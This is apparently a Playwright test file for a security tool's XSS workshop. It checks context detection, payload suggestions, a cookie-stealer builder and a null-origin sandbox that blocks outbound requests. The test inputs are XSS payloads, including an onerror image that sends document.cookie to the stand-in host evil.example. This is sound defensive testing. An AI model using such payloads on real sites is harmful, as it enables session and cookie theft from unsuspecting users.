import { expect, test, type Page } from '@playwright/test';

// The XSS workshop through the real UI. The sandbox tester is the proof the unit tests cannot
// give: the payload really executes in an iframe, that iframe has a null origin and its own strict
// CSP, and NOT ONE request reaches the network while a cookie-exfil payload runs. Everything here
// is self-made; no real cookie, no real target.

const out = (page: Page) => page.locator('.pane-out');
const runBtn = (page: Page) => page.getByRole('button', { name: 'Run', exact: true });
const mode = (page: Page, name: string) =>
  page.locator('#opt-xss-workshop-mode').selectOption({ label: name });

/** Open the tool, recording page errors and every request that tries to leave the app's origin. */
async function open(page: Page, baseURL: string | undefined) {
  const origin = new URL(baseURL ?? 'http://localhost:4173/').origin;
  const errors: string[] = [];
  const offsite: string[] = [];
  const routed: string[] = [];
  page.on('pageerror', (e) => errors.push(e.message));
  page.context().on('request', (r) => {
    const u = r.url();
    if (!u.startsWith('blob:') && !u.startsWith('data:') && new URL(u).origin !== origin) {
      offsite.push(u);
    }
  });
  await page.route(
    (url) => url.origin !== origin && url.protocol.startsWith('http'),
    (route) => {
      routed.push(route.request().url());
      return route.abort();
    },
  );
  await page.goto('./#/tool/xss-workshop');
  return { errors, offsite, routed };
}

const MARKER = 'xMARKERx';

test('context mode classifies a double-quoted attribute and reads the escaping', async ({
  page,
  baseURL,
}) => {
  const w = await open(page, baseURL);
  await page.locator('.input-text').fill(`<input name="q" value="${MARKER}'"<>">`);
  await mode(page, 'Context');
  await runBtn(page).click();
  await expect(out(page)).toContainText('Double-quoted attribute');
  await expect(out(page)).toContainText('you can break out');
  expect(w.errors).toEqual([]);
  expect(w.offsite).toEqual([]);
});

test('payloads mode auto-detects the context and lists context-aware payloads', async ({
  page,
  baseURL,
}) => {
  await open(page, baseURL);
  await page.locator('.input-text').fill(`<input value="${MARKER}">`);
  await mode(page, 'Payloads');
  await runBtn(page).click();
  await expect(out(page)).toContainText('Double-quoted attribute');
  await expect(out(page).locator('.out-table')).toContainText('onmouseover');
  await expect(out(page).locator('.out-table')).toContainText('No < or > needed');
});

test('exfil mode builds a cookie stealer for your own collector, and sends nothing', async ({
  page,
  baseURL,
}) => {
  const w = await open(page, baseURL);
  await mode(page, 'Exfil');
  // Like every tool here, it runs on the main input; exfil reads the collector from its option.
  await page.locator('.input-text').fill('x');
  await page.locator('#opt-xss-workshop-collector').fill('https://abcd1234.webhook.site');
  await runBtn(page).click();
  await expect(out(page)).toContainText('https://abcd1234.webhook.site');
  await expect(out(page)).toContainText('document.cookie');
  await expect(out(page)).toContainText('HttpOnly');
  await page.waitForTimeout(300);
  // Building the payload text contacts nothing.
  expect(w.offsite).toEqual([]);
  expect(w.routed).toEqual([]);
});

test('the sandbox runs a payload in a null-origin frame and lets nothing out', async ({
  page,
  baseURL,
}) => {
  const w = await open(page, baseURL);
  // A cookie-exfil payload: it fires, tries to send the cookie, and must reach no network.
  const payload = `<img src=x onerror="new Image().src='https://evil.example/c?'+document.cookie">`;
  await page.locator('.input-text').fill(payload);
  await mode(page, 'Sandbox');
  await runBtn(page).click();
  await out(page).getByRole('button', { name: 'Run in the sandbox', exact: true }).click();

  await expect(out(page)).toContainText('Payload executed', { timeout: 10_000 });
  // The intended exfil is recorded, carrying the clearly-fake demo cookie, and marked never sent.
  await expect(out(page).locator('.xss-attempts')).toContainText('https://evil.example/c?');
  await expect(out(page).locator('.xss-attempts')).toContainText('FTF_SANDBOX_FAKE_COOKIE');
  await expect(out(page)).toContainText('Nothing was sent');

  // The frame is sandboxed WITHOUT allow-same-origin (null origin).
  const sandboxAttr = await out(page).locator('iframe.xss-frame').getAttribute('sandbox');
  expect(sandboxAttr).toBe('allow-scripts');

  await page.waitForTimeout(300);
  // The JS sink was stubbed, so no request was ever created: nothing reached the network.
  expect(w.offsite).toEqual([]);
  expect(w.routed).toEqual([]);
  expect(w.errors).toEqual([]);
});

test('a raw <img src> exfil is blocked by the frame CSP, never reaching the network', async ({
  page,
  baseURL,
}) => {
  const w = await open(page, baseURL);
  const payload = `<img src="https://evil.example/raw.png">`;
  await page.locator('.input-text').fill(payload);
  await mode(page, 'Sandbox');
  await runBtn(page).click();
  await out(page).getByRole('button', { name: 'Run in the sandbox', exact: true }).click();
  await expect(out(page).locator('.xss-report')).toBeVisible({ timeout: 10_000 });
  await expect(out(page).locator('.xss-attempts')).toContainText('evil.example/raw.png');
  // CSP blocks the load before the network: the abort route never saw it.
  await page.waitForTimeout(400);
  expect(w.routed).toEqual([]);
  expect(w.errors).toEqual([]);
});

test('help mode gives the webhook.site walkthrough', async ({ page, baseURL }) => {
  await open(page, baseURL);
  await mode(page, 'Help');
  await page.locator('.input-text').fill('x');
  await runBtn(page).click();
  await expect(out(page)).toContainText('webhook.site');
  await expect(out(page)).toContainText('document.cookie');
  await expect(out(page)).toContainText('Authorised targets only');
});

test('home triage suggests the tool for pasted reflection output', async ({ page }) => {
  await page.goto('./');
  await page.getByLabel('Paste data to identify').fill(`<input value="${MARKER}">`);
  const guess = page.locator('.guess', { hasText: 'XSS workshop' });
  await expect(guess).toBeVisible();
  await guess.click();
  await expect(page).toHaveURL(/#\/tool\/xss-workshop/);
});

for (const locale of ['en', 'fr', 'ru', 'zh', 'hi']) {
  test(`the sandbox result is translated and fits a phone (390×844, ${locale})`, async ({
    page,
    baseURL,
  }) => {
    await page.setViewportSize({ width: 390, height: 844 });
    await page.addInitScript((l) => localStorage.setItem('ftf.locale', l), locale);
    const w = await open(page, baseURL);
    await page.locator('.input-text').fill('<img src=x onerror=alert(1)>');
    await page.locator('.examples button').first().click();
    await expect(out(page)).toBeVisible({ timeout: 15_000 });
    expect(await page.locator('body').innerText()).not.toContain('tool.xss-workshop.');
    expect(await page.locator('body').innerText()).not.toContain('ui.xss.');
    const widest = () =>
      page.evaluate(() =>
        Math.max(
          0,
          ...[...document.querySelectorAll('.options .opt, .pane-in, .out-stack > *')].map(
            (e) => e.getBoundingClientRect().right,
          ),
        ),
      );
    expect(await widest()).toBeLessThanOrEqual(390);
    expect(w.errors).toEqual([]);
  });
}
